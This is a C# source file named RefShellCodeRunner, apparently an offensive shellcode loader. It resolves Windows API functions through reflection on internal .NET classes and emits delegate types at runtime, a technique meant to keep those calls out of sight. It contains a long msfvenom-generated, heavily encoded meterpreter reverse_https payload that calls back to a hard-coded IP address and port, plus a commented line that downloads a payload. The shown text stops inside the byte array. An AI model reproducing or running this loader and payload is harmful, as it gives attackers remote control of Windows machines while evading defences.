
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Data;
using System.Reflection.Emit;
using System.Net.Http;
using System.IO;
using System.Security.Cryptography;
using System.Net;

namespace RefShellCodeRunner
    {
    class Program
    {
        static void Main(string[] args)
        {
            Type UNSAFEWin32Type = typeof(Int16);
            //Search For This File amd Assembly sysdll = Assembly.LoadFrom(@" C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll");
            Assembly sysdll = Assembly.LoadWithPartialName("System");
            Console.WriteLine("Search For Target Classes");
            Console.Beep();

            Type[] ts = sysdll.GetTypes();
            foreach (var type in ts)
            {
                if (type.FullName.Equals("Microsoft.Win32.UnsafeNativeMethods"))
                {
                    UNSAFEWin32Type = type;
                    Console.WriteLine("Found Traget Class: " + type.FullName);

                }

            }
            MethodInfo[] methods = UNSAFEWin32Type.GetMethods();
            int i = 0;
            Console.WriteLine("Search For Target Functions");
            Console.Beep();
            MethodInfo GetModuleHAND = typeof(int).GetMethod("trash");
            MethodInfo GetProcADDR = typeof(int).GetMethod("trash");
            foreach (var m in methods)
            {
                if (m.Name.Equals("GetModuleHandle"))
                {
                    GetModuleHAND = m;
                    Console.WriteLine($"Found Target Function : {i} {GetModuleHAND.Name} ");

                }

                if (m.Name.Equals("GetProcAddress"))
                {
                    GetProcADDR = m;
                    Console.WriteLine($"Found Target Function : {i} {GetProcADDR.Name} ");
                    break;
                }
                i++;
            }


            ///var MyAssembly = AppDomain.CurrentDomain.GetType().Assembly.GetName();
            ///var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(MyAssembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);

            object ExecFunctionWithReflection6(string DLLName, string FucntionName, object p1, object p2, object p3, object p4, object p5, object p6, object returnDT)
            {
                IntPtr DynamicLookUPFunc()
                {
                    object retptr = GetProcADDR.Invoke(null, new object[] { GetModuleHAND.Invoke(null, new object[] { DLLName }), FucntionName });
                    IntPtr ADDR = (IntPtr)retptr;
                    Console.WriteLine($"Hooking {FucntionName} From {DLLName}........");
                    Console.Beep();
                    Console.WriteLine($"Address of {FucntionName} is: 0x" + ADDR.ToString("X"));
                    return ADDR;
                }

                Assembly myAsm;
                AssemblyName assembly;
                assembly = new AssemblyName();
                assembly.Name = "ReflectionEmitDelegateTest";
                var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType(), p5.GetType(), p6.GetType() });
                constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, returnDT.GetType(), new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType(), p5.GetType(), p6.GetType() });
                MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                Type tex = MyTypeBuilder.CreateType();
                var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(), tex);
                var FuncRet = func.DynamicInvoke(new object[] { p1, p2, p3, p4, p5, p6 });
                Console.WriteLine($"Invoking  {FucntionName} With Address {FuncRet}...........");

                return FuncRet;
            }



            object ExecFunctionWithReflection2(string DLLName, string FucntionName, object p1, object p2, object returnDT)
            {
                IntPtr DynamicLookUPFunc()
                {
                    object retptr = GetProcADDR.Invoke(null, new object[] { GetModuleHAND.Invoke(null, new object[] { DLLName }), FucntionName });
                    IntPtr ADDR = (IntPtr)retptr;
                    Console.WriteLine($"Hooking {FucntionName} From {DLLName}........");
                    Console.Beep();
                    Console.WriteLine($"Address of {FucntionName} is: 0x" + ADDR.ToString("X"));
                    return ADDR;
                }

                Assembly myAsm;
                AssemblyName assembly;
                assembly = new AssemblyName();
                assembly.Name = "ReflectionEmitDelegateTest";
                var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { p1.GetType(), p2.GetType() });
                constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, returnDT.GetType(), new Type[] { p1.GetType(), p2.GetType() });
                MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                Type tex = MyTypeBuilder.CreateType();
                var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(), tex);
                var FuncRet = func.DynamicInvoke(new object[] { p1, p2 });
                Console.WriteLine($"Invoking  {FucntionName} With Return {FuncRet}...........");

                return FuncRet;
            }






            object ExecFunctionWithReflection4(string DLLName, string FucntionName, object p1, object p2, object p3, object p4, object returnDT)
            {
                IntPtr DynamicLookUPFunc()
                {
                    object retptr = GetProcADDR.Invoke(null, new object[] { GetModuleHAND.Invoke(null, new object[] { DLLName }), FucntionName });
                    IntPtr ADDR = (IntPtr)retptr;
                    Console.WriteLine($"Hooking {FucntionName} From {DLLName}........");
                    Console.Beep();
                    Console.WriteLine($"Address of {FucntionName} is: 0x" + ADDR.ToString("X"));
                    return ADDR;
                }

                Assembly myAsm;
                AssemblyName assembly;
                assembly = new AssemblyName();
                assembly.Name = "ReflectionEmitDelegateTest";
                var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType() });
                constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, returnDT.GetType(), new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType() });
                MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                Type tex = MyTypeBuilder.CreateType();
                var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(), tex);
                var FuncRet = func.DynamicInvoke(new object[] { p1, p2, p3, p4, });
                Console.WriteLine($"Invoking  {FucntionName} With Returned Value {FuncRet}...........");

                return FuncRet;
            };
            
            //Byte[] shel = new WebClient().DownloadData("http://127.0.0.1:2100/FILE.bin");
            /*byte[] shellcodeBytes = //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.29.216.161  LPORT=8488 -b '\xab' -e  x64/zutto_dekiru -i 30 -f csharp
            {0x48,0x31,0xed,0xda,0xcb,0x54,
            0x66,0xbd,0x17,0x01,0x41,0x5c,0x66,0x41,0x81,0xe4,0x90,0xf1,
            0x48,0xba,0x06,0xe0,0xbb,0xdd,0xca,0xc2,0x8a,0x0c,0x49,0x0f,
            0xae,0x04,0x24,0x49,0x83,0xc4,0x08,0x4d,0x8b,0x2c,0x24,0x48,
            0xff,0xcd,0x49,0x31,0x54,0xed,0x33,0x48,0x85,0xed,0x75,0xf3,
            0x4b,0xd1,0x69,0x89,0xac,0x83,0x30,0x1c,0x07,0xa1,0xe5,0xbb,
            0x8b,0x43,0x6c,0x6c,0xfa,0x3b,0x77,0x94,0xc5,0x6c,0x8c,0x45,
            0xbf,0xb7,0x3c,0x51,0x22,0xf5,0x1e,0x06,0x7b,0xa9,0x38,0x1b,
            0xc2,0x8b,0x01,0x32,0x4f,0x1f,0x71,0x93,0xfb,0x8e,0x5d,0x28,
            0x4b,0x65,0x69,0xa8,0x39,0xd8,0x3c,0x76,0xa7,0x6a,0x92,0x6f,
            0x00,0x72,0x03,0x38,0xc3,0x56,0x66,0x5e,0x54,0x4c,0xe6,0xe6,
            0xaf,0x56,0xcc,0xa7,0x4e,0xf3,0x4c,0x3e,0xe7,0xd6,0x66,0xd8,
            0x19,0x96,0x44,0x03,0x2d,0xdf,0x66,0x5c,0x9c,0xdc,0xf2,0x4e,
            0xa0,0xe6,0x43,0x22,0x92,0xd8,0x88,0x76,0x9b,0x24,0xdb,0xe6,
            0xe0,0x3a,0x32,0xd5,0xa5,0x17,0x13,0x8f,0x10,0x88,0x4b,0x80,
            0xdd,0xe5,0x59,0x53,0x17,0x84,0xed,0xcf,0x18,0x9c,0xf4,0xd2,
            0x02,0x73,0x4a,0x37,0x6d,0x56,0xdb,0xec,0xc0,0x7a,0x4a,0xb3,
            0xdb,0x1e,0x6d,0xa2,0x48,0x43,0x47,0xd3,0xdd,0x1e,0x17,0x82,
            0x75,0x81,0x54,0x02,0xea,0x0c,0xc4,0x18,0x0c,0x75,0xe4,0x50,
            0xc9,0x27,0xb4,0x42,0xa7,0x8a,0xb3,0x89,0x40,0xd1,0x7f,0x87,
            0xde,0x78,0x93,0xd2,0x77,0x6a,0xc4,0x2a,0x12,0xc8,0x96,0xf1,
            0x00,0x23,0x7a,0x52,0xa5,0xb4,0x41,0x54,0x2f,0x27,0x00,0x42,
            0x9b,0x76,0xaf,0xa4,0xce,0x4d,0xd5,0x94,0xca,0xcc,0x58,0xc0,
            0x29,0xa0,0xa6,0x1d,0xf8,0x8c,0x3c,0xf3,0xb9,0x74,0x0b,0x3a,
            0xd9,0x8a,0x49,0x96,0x78,0x21,0xfd,0x8c,0x1a,0xf6,0xef,0xdd,
            0xc7,0x59,0x46,0xf1,0xed,0x73,0xcc,0xdd,0xbd,0x61,0x7e,0x33,
            0x1f,0x54,0x98,0xb1,0x02,0xb3,0x33,0xd2,0xa2,0x15,0x37,0x78,
            0x15,0xb7,0xba,0x1f,0x94,0x0a,0xbc,0x70,0x65,0xe3,0x1c,0x53,
            0xcb,0x3a,0xd7,0x79,0x54,0x11,0x4a,0x98,0x03,0x9c,0x9c,0xb3,
            0xfa,0xb7,0xfd,0xd2,0x8b,0xa5,0x94,0xf3,0xd7,0xb3,0x87,0xd2,
            0xb1,0x67,0x99,0x59,0x9f,0xc6,0x91,0x51,0x98,0xd7,0x9d,0xd3,
            0xfb,0x29,0x50,0x28,0x31,0xe7,0xbc,0xad,0x1d,0xd3,0xcb,0x7e,
            0x59,0x72,0x9d,0x67,0xd5,0xd7,0x4a,0xda,0x6d,0x62,0x9d,0xeb,
            0xbe,0x9a,0x03,0x10,0xb4,0x8a,0x9d,0x97,0xb7,0xdc,0x7b,0xc7,
            0x3c,0xbb,0x99,0xed,0x9f,0xe7,0xb9,0x4f,0xb9,0x4d,0x38,0xc8,
            0x27,0x28,0xc6,0xa7,0xc7,0x63,0x64,0x61,0xc6,0xd0,0x03,0x13,
            0x04,0x11,0x80,0x50,0xea,0xb2,0x80,0xb5,0x65,0x22,0x85,0xc8,
            0x95,0x3d,0x87,0x57,0xe9,0xaf,0x2f,0x7f,0xdc,0xb7,0xbe,0x7f,
            0xb5,0xbf,0x2f,0x05,0xc4,0x8f,0x7c,0xf7,0x18,0x72,0xce,0x61,
            0xfc,0xaf,0x4a,0xd8,0xd0,0x12,0x67,0xb0,0xcb,0xc6,0x5b,0xf7,
            0x9e,0x3d,0x87,0x19,0x82,0xf2,0xf5,0x94,0x23,0x1f,0xbe,0xae,
            0x87,0x3f,0x0c,0xd7,0x99,0xdb,0x79,0x98,0x70,0x47,0xf3,0x7b,
            0xb8,0xdb,0x03,0x90,0x49,0x85,0x4a,0x45,0x5d,0x47,0x4b,0xe9,
            0x24,0xed,0xf2,0x17,0x76,0x6c,0x3b,0xa8,0x83,0x7d,0xd6,0x85,
            0xb4,0x8f,0x0c,0x21,0x7f,0x4a,0x49,0xf8,0x4b,0x5f,0x1f,0x1f,
            0x1c,0x84,0x80,0x0a,0xb3,0x6c,0x81,0x4e,0x8b,0x32,0xcb,0x83,
            0x8a,0x4d,0xce,0x42,0x8f,0x48,0xc3,0xb9,0x48,0x7c,0x81,0x14,
            0xbb,0x52,0x5b,0x8a,0x88,0xc0,0xc1,0xbd,0xe2,0x49,0x57,0x0e,
            0xaa,0xee,0x4f,0xf2,0x33,0xfa,0xaa,0x28,0x68,0xf3,0x42,0x1e,
            0xc8,0x65,0xd8,0xf7,0xee,0xe7,0x48,0x15,0xcd,0x7e,0x59,0x8a,
            0x01,0x4e,0x6f,0x11,0xb7,0x5e,0x63,0x48,0x2f,0x67,0x5d,0x6f,
            0xb0,0x1d,0x81,0x2d,0x46,0x63,0x73,0x1f,0xf1,0xa9,0x90,0x85,
            0xbe,0x12,0x4f,0x16,0x0e,0x12,0x5b,0x36,0xd2,0x82,0x5c,0x51,
            0xde,0x49,0x89,0xf6,0x36,0xa3,0x58,0xd5,0x60,0x01,0x3f,0xbd,
            0xbf,0x9a,0x59,0x9c,0x42,0x01,0x45,0xb5,0x83,0x58,0x07,0x27,
            0xe3,0x5a,0xd2,0xd0,0xb4,0x03,0xa9,0x16,0xf6,0x52,0xee,0xf4,
            0x08,0x57,0x07,0x19,0xa0,0x14,0x13,0x8f,0xe5,0xc3,0x79,0x13,
            0x77,0xe8,0xbc,0x89,0x9e,0x09,0x11,0x1e,0x46,0xed,0x96,0x7f,
            0xe3,0xce,0xa4,0x37,0x46,0x97,0xb6,0x43,0x21,0xfd,0xb7,0x4b,
            0x53,0xef,0x48,0x44,0xaa,0x11,0x68,0x74,0x43,0x5a,0x73,0x90,
            0x37,0x6e,0xc8,0x46,0x4a,0xea,0x43,0x51,0x9d,0xfc,0x01,0x8e,
            0x09,0xd9,0x1a,0x98,0xee,0x77,0x06,0x6d,0x80,0x49,0xe9,0x2e,
            0xa7,0xfc,0x3f,0x6c,0xdf,0x49,0xe9,0x54,0xbf,0xc0,0xfd,0x03,
            0xda,0x0c,0x05,0x75,0x4e,0x77,0xe9,0xa8,0x83,0x17,0x09,0xf0,
            0x1f,0x59,0xd6,0xde,0xeb,0x7e,0xea,0x6c,0xa4,0x98,0x8f,0x92,
            0xb2,0xa7,0x47,0xea,0xa9,0x5d,0xe3,0x18,0x5b,0xa6,0xb7,0x88,
            0xe1,0x20,0x1c,0xa9,0x44,0xa2,0xcd,0xa0,0xdf,0xe2,0xb5,0xc2,
            0x0b,0x05,0xe9,0xa9,0xf9,0x2c,0x9b,0x72,0x21,0x0d,0x95,0x02,
            0x9c,0x42,0xfd,0xe4,0xaf,0xb5,0x52,0xa6,0xe7,0xbe,0xf2,0x5d,
            0xc1,0xfc,0xcf,0x06,0xa8,0xa5,0xf5,0xbb,0x3d,0x84,0x29,0x7b,
            0x5f,0x3c,0xd5,0xbb,0x47,0x84,0x15,0xb9,0x4d,0x3d,0xa7,0xaf,
            0xe1,0x36,0x30,0x93,0xe7,0xdb,0x16,0xd5,0x8a,0x2f,0x93,0xda,
            0xd6,0xa8,0x8c,0xdf,0xbb,0x99,0xbc,0x7f,0xd6,0x45,0x42,0xd7,
            0x35,0xd1,0x8a,0xc7,0x14,0x30,0xe2,0xd7,0xb1,0x79,0xc5,0x71,
            0x5c,0xb8,0xdb,0xfa,0xe2,0x4c,0xc1,0x0b,0x4c,0x83,0x19,0xca,
            0xf3,0x2f,0xe0,0xcb,0xe7,0xdf,0x40,0x0a,0xea,0x06,0x28,0x8d,
            0x16,0x7d,0x46,0x21,0x2c,0x77,0x00,0x35,0xfd,0x76,0xbd,0x8c,
            0xe4,0x52,0x38,0x46,0xe7,0xae,0xbd,0x08,0x62,0x1a,0x8f,0x0e,
            0x6b,0x97,0xb9,0x5e,0x50,0x1a,0xf5,0x1e,0x52,0x55,0xc0,0x22,
            0x9f,0xc6,0xd2,0xae,0xf1,0x4f,0x33,0x4d,0xd5,0xfc,0xfe,0x3d,
            0x6a,0xe0,0x84,0x75,0xc5,0x75,0x29,0x80,0xe6,0x09,0x26,0x14,
            0xf7,0x0e,0x45,0xfb,0xe1,0x0e,0xc0,0xec,0x8f,0xdf,0x38,0x2c,
            0x77,0x2f,0xc0,0x96,0x9f,0xe7,0xfa,0x66,0xb6,0x89,0x37,0x6f,
            0x52,0xad,0xc2,0x9c,0xaa,0x0e,0xfe,0xbf,0x00,0x8f,0x4c,0x90,
            0x56,0xaf,0x14,0x48,0x02,0x14,0x17,0x8b,0x77,0x67,0xd1,0x5f,
            0xc8,0xf7,0xc4,0x26,0x77,0xe3,0x66,0x16,0x7f,0xbe,0x49,0x1f,
            0x4b,0xbb,0x54,0x16,0x05,0xa6,0x70,0xdd,0x1f,0x15,0xbd,0x48,
            0x82,0x48,0x8d,0x34,0x32,0x64,0x5d,0xc1,0xe5,0xcd,0xda,0xc3,
            0x67,0x50,0x72,0x09,0x83,0xf3,0xb7,0x7e,0x1f,0xa0,0xba,0x4f,
            0x42,0xa3,0x98,0xc2,0xdd,0xe0,0x1c,0x00,0xfd,0xdb,0x5b,0xba,
            0x02,0x56,0x37,0x00,0x87,0xeb,0x62,0x78,0xb6,0x11,0xa9,0xde,
            0x64,0x8c,0xeb,0xc5,0x07,0x8f,0x4d,0xd9,0xd5,0x9a,0xb3,0x14,
            0xbe,0xf4,0xf2,0x55,0x19,0x48,0x53,0xb9,0xb6,0xa0,0x3a,0x17,
            0xd9,0x1b,0xfa,0x0d,0x74,0xd4,0x9c,0x5d,0x67,0x63,0x3c,0x71,
            0x8b,0x68,0xb2,0x59,0x1d,0x6b,0x06,0xb3,0x8f,0x54,0x97,0x7a,
            0x89,0xcf,0xc2,0xd8,0x3f,0x03,0x71,0x6a,0x0c,0xa2,0xc0,0x42,
            0xa4,0x24,0xe9,0xd2,0x50,0xd7,0x50,0xbe,0x8b,0x6a,0xc6,0x32,
            0x41,0x99,0x08,0x29,0x49,0x3c,0x60,0x7a,0xff,0xe1,0xc5,0x51,
            0x86,0x9e,0x72,0x7e,0x85,0xd1,0xfe,0x93,0x6b,0x4e,0x40,0x8e,
            0x4d,0xfc,0x1a,0x8e,0x59,0x42,0xf0,0x8c,0x7c,0x5b,0x89,0x4d,
            0x91,0x05,0x30,0xde,0x71,0xea,0x7f,0xd7,0xe6,0xfb,0x33,0x1b,
            0x5d,0x91,0x9b,0x0f,0xb4,0x45,0x79,0x23,0xf3,0x6e,0x8b,0x73,
            0x43,0xe3,0x5b,0x27,0x89,0x46,0xb5,0xb1,0xfe,0x92,0xb8,0xe1,
            0x3c,0xaa,0x2a,0xd1,0xcc,0x9b,0x08,0xc9,0x3d,0x03,0xba,0x16,
            0x04,0xdb,0xc1,0x97,0x76,0x6a,0xdc,0xf9,0xfc,0x6c,0x79,0x7f,
            0xcc,0x84,0xbe,0x92,0xdb,0xd2,0xc1,0xd7,0xb4,0xba,0xc2,0x65,
            0x64,0xf3,0xc1,0xad,0xb4,0x86,0x00,0x5a,0x02,0x35,0xd9,0x0f,
            0x11,0xd5,0xed,0x9b,0xd1,0x93,0x28,0xff,0x29,0x33,0x5d,0x5b,
            0x8b,0xe7,0x7a,0xea,0xa6,0xdb,0xdf,0xa6,0xdd,0xbc,0x66,0xd0,
            0xc9,0x4e,0x2f,0x60,0x3b,0xbd,0x96,0xb6,0x86,0x32,0xe0,0xd4,
            0x19,0xbd,0xec,0xbe,0xbe,0xf0,0xe2,0x5b,0xc1,0x19,0x53,0xc5,
            0x84,0x36,0x62,0x49,0x96,0x67,0xf1,0xb2,0x14,0xa5,0xb9,0xaf,
            0xa5,0xd0,0x0f,0x43,0xe4,0xe4,0x7f,0xca,0xa9,0x98,0x27,0x49,
            0xf4,0x97,0xbe,0x49,0x58,0x57,0xf8,0x34,0x0b,0x12,0x91,0x49,
            0x22,0x67,0xc4,0xf6,0xe0,0x9d,0xf7,0xf9,0xac,0xc2,0xf0,0xc9,
            0x70,0xcb,0x33,0x65,0xf7,0x5b,0x7c,0xff,0x8d,0x68,0xd9,0x89,
            0xed,0x74,0xb1,0x60,0x89,0x13,0xf6,0xc7,0xc2,0x94,0xf8,0x18,
            0x53,0x7e,0xf7,0x37,0xa4,0xda,0x80,0xff,0xfc,0x59,0xf7,0x4d,
            0xac,0xe3,0x42,0x4b,0x4d,0x2c,0x33,0x5d,0x49,0x9b,0xd9,0x0f,
            0x79,0xda,0x05,0xb4,0xeb,0xbd,0xc9,0x5e,0x15,0x0d,0x82,0xfe,
            0x48,0x13,0x7d,0x56,0x9b,0x43,0x72,0xb7,0x5f,0x6b,0x24,0x6f,
            0x9c,0xa5,0x8d,0xcf,0x4c,0x13,0xe3,0xc9,0xba,0xa5,0xf7,0xd7,
            0x75,0xd1,0x25,0x47,0xfa,0x3e,0xf5,0x5c,0x27,0xbd,0xd9,0x0f,
            0x38,0x8b,0x44,0xe4,0xb9,0xf5,0xe8,0xdd,0x1c,0x92,0x8e,0xe6,
            0x8b,0xf5,0x52,0x5d,0x61,0x8b,0x53,0xfc,0x60,0xef,0xf9,0x42,
            0x48,0x13,0x4d,0x3f,0x99,0xed,0x91,0x00,0xce,0x90,0x4f,0xfc,
            0xda,0x7d,0x75,0x33,0x18,0xa6,0x07,0x98,0xcb,0xfc,0x18,0xc6,
            0x74,0x9b,0x04,0x75,0x09,0x50,0x8b,0x4e,0x28,0x92,0x8e,0xe6,
            0xcb,0x36,0x9b,0x33,0x31,0xdb,0xd5,0xd2,0x6a,0xc5,0xc1,0x04,
            0x7b,0xd5,0x80,0xc6,0xeb,0xbd,0xd9,0x84,0xf9,0x52,0x05,0xb4,
            0xeb,0xf5,0x5c,0xcf,0x0d,0xbd,0x4d,0xb5,0x3b,0xed,0x9d,0x84,
            0x39,0xfa,0x4c,0xb5,0x3b,0x36,0x91,0x17,0x9a,0x8c,0x4d,0x4b,
            0x22,0xfc,0x52,0x3b,0xf1,0x92,0x04,0x62,0xa6,0x8c,0x10,0x47,
            0x48,0x1a,0x44,0x75,0x22,0xb0,0x75,0x4e,0x78,0x1b,0x3d,0x54,
            0x9e,0x4c,0x95,0x0c,0x35,0xfe,0x0d,0xf1,0xd2,0x6c,0xac,0xd7,
            0x21,0x9e,0x8e,0xf4,0xcf,0xf4,0xd8,0xdf,0x1f,0x9b,0x8e,0xb8,
            0xa3,0xf9,0x52,0x4f,0x65,0x93,0x04,0x64,0xaa,0x36,0xdd,0x87,
            0x31,0xdb,0xd5,0xf5,0xb3,0xfc,0x81,0x51,0x20,0x80,0x44,0xec,
            0xaa,0xe4,0x98,0x55,0x31,0x59,0xe9,0x94,0xaa,0xef,0x26,0xef,
            0x21,0x9b,0x5c,0xee,0xa3,0x36,0xcb,0xe6,0x32,0x25,0xfa,0x4b,
            0xb6,0xf5,0xe8,0xd4,0x2a,0x93,0xbb,0xc3,0x82,0xd3,0xb0,0x61,
            0x1c,0xae,0x05,0xf5,0xbd,0xf5,0x50,0xee,0x30,0x1d,0xc7,0xf8,
            0x9c,0x9b,0xde,0xf0,0xac,0x89,0x56,0xfc,0x62,0x5c,0x8a,0x55,
            0x34,0xeb,0xc5,0xf9,0xda,0x74,0x8a,0x5c,0x30,0x60,0x3f,0xe2,
            0x92,0x1a,0xd9,0x0f,0x79,0xda,0xfa,0x61,0x03,0xb2,0xd9,0x0f,
            0x79,0xeb,0x32,0x86,0xc5,0x8f,0xe0,0x21,0x4b,0xeb,0x33,0x9a,
            0xda,0x8b,0xe8,0x0f,0x23,0x92,0x8c,0x75,0xa2,0x7a,0x19,0x27,
            0x58,0xda,0x05,0xf9,0xda,0x74,0x8a,0x5c,0x13,0xd9,0x56,0xfd,
            0x51,0xea,0x50,0x90,0xbf,0xda,0x05,0xb4,0xeb,0x42,0x0c,0xe7,
            0xb7,0xda,0x05,0xb4,0xc4,0xdc,0xaf,0x5e,0x12,0x9b,0x5a,0xf5,
            0xda,0x8c,0xa9,0x63,0x08,0xa0,0x42,0xc2,0xa4,0xfe,0x8f,0x4c,
            0x01,0x9e,0x72,0x81,0x89,0xe2,0xaf,0x36,0x30,0xef,0x54,0x81,
            0x8f,0xd4,0xe8,0x3b,0x17,0x9b,0x52,0xd8,0xdc,0xfe,0xbb,0x3f,
            0x11,0xb7,0x4a,0xf3,0xd2,0xe2,0x92,0x5e,0x2a,0xac,0x46,0xe5,
            0x9a,0xec,0x88,0x48,0x1a,0x9f,0x3c,0xd6,0xd3,0xc8,0xed,0x36,
            0x36,0xa3,0x50,0xdc,0xac,0xfc,0x8a,0x59,0x4a,0xe9,0x57,0xf0,
            0x9f,0xd8,0x9f,0x7c,0x0a,0x99,0x54,0xc6,0xb2,0xf1,0x96,0x5e,
            0x34,0xa9,0x60,0xd7,0x9f,0xc8,0xea,0x69,0x31,0x8c,0x33,0xc2,
            0x83,0xc5,0x81,0x3f,0x0b,0xb4,0x32,0x80,0xbd,0xc7,0xee,0x40,
            0x41,0x9b,0x69,0xe3,0xa4,0xcc,0xf4,0x42,0x2f,0xb5,0x4e,0xd1,
            0xae,0x85,0x8b,0x4a,0x4b,0xb7,0x5d,0xe0,0x80,0xfe,0xa3,0x5c,
            0x11,0x93,0x54,0xdc,0xbd,0xdb,0xbc,0x41,0x1e,0x97,0x53,0xe0,
            0x93,0xd4,0xb8,0x5e,0x13,0xad,0x67,0xee,0xd8,0xd1,0x97,0x4b,
            0x2e,0x83,0x66,0xdd,0xb9,0xf9,0xee,0x55,0x1f,0xaa,0x41,0xcd,
            0x80,0xd7,0x94,0x5b,0x03,0xa2,0x33,0xe7,0x8d,0xdc,0xba,0x50,
            0x2f,0xb3,0x7d,0xf3,0x85,0xcf,0x9a,0x6b,0x3d,0x97,0x7d,0xd8,
            0xac,0xee,0xaa,0x5f,0x2c,0xda,0x4d,0x3d,0x2a,0xee,0x83,0x4e,
            0x21,0x97,0x34,0x7d,0xb8,0xf5,0x61,0x0f,0x4b,0x72,0x81,0xb4,
            0xeb,0xbd,0xd9,0x5f,0x2a,0x89,0x4c,0x73,0x29,0x56,0x8c,0x21,
            0x42,0x25,0xd0,0xfc,0x62,0x7b,0xb3,0x05,0x26,0x92,0x8c,0x45,
            0x81,0xa2,0x83,0x5d,0x11,0x5a,0x36,0xb4,0xeb,0xf4,0x50,0xef,
            0x13,0xde,0x44,0xed,0xa2,0x07,0xac,0x49,0xe7,0x5c,0x05,0xb4,
            0xeb,0xbd,0x26,0xda,0x34,0xeb,0xc5,0xe7,0xb1,0xf5,0x50,0xfe,
            0x34,0xeb,0xcc,0xf9,0xda,0x74,0x8a,0x5c,0x30,0x1d,0xc7,0x99,
            0xed,0xa5,0xa2,0xf0,0xac,0x5f,0xc5,0xc1,0xf4,0xf5,0x1e,0xce,
            0xf1,0xc9,0x05,0xb4,0xa2,0x07,0x9d,0xff,0x4c,0x3a,0x05,0xb4,
            0xeb,0xbd,0x26,0xda,0x31,0x25,0xca,0xc0,0xe9,0x56,0x73,0xe7,
            0x2c,0xda,0x05,0xb4,0xb8,0xe4,0xb3,0x4f,0x23,0x93,0x8c,0x65,
            0x2a,0x5f,0xc9,0x46,0xbe,0x1a,0x05,0xa4,0xeb,0xbd,0x90,0xb5,
            0x21,0x7e,0x56,0x51,0xeb,0xbd,0xd9,0x0f,0x86,0x0f,0x4d,0x27,
            0xb8,0xee,0x91,0x86,0x9e,0x92,0x8c,0x45,0xa3,0x34,0x03,0x46,
            0xbe,0x1a,0x05,0x94,0xeb,0xbd,0x90,0x86,0x80,0x93,0xbf,0xa6,
            0x7d,0x34,0x3b,0x0f,0x79,0xda,0x05,0x4b,0x3e,0xf5,0x5a,0xcb,
            0x59,0x5f,0xc5,0xc0,0x59,0xdb,0x52,0x08,0x31,0xdb,0xc6,0x31,
            0x2b,0xc8,0x0b,0x57,0xba,0x82,0x6f,0xb4,0xb2,0xf4,0x1e,0xcd,
            0x89,0x6f,0xa7,0xe2,0x14,0x68,0xe7,0xac,0x86,0x7d,0x35,0x5b,
            0xc7,0xdd,0xd7,0x52,0x1b,0x58,0x2a,0xe3,0x91,0xfb,0x08,0x9b,
            0x74,0xcf,0x75,0xce,0xb2,0xc9,0xf9,0x2c,0x43,0x57,0x5d,0x4e,
            0x2e,0x15,0x54,0xcf,0x7c,0x0f,0x5b,0x42,0x90,0x9e,0x49,0x47,
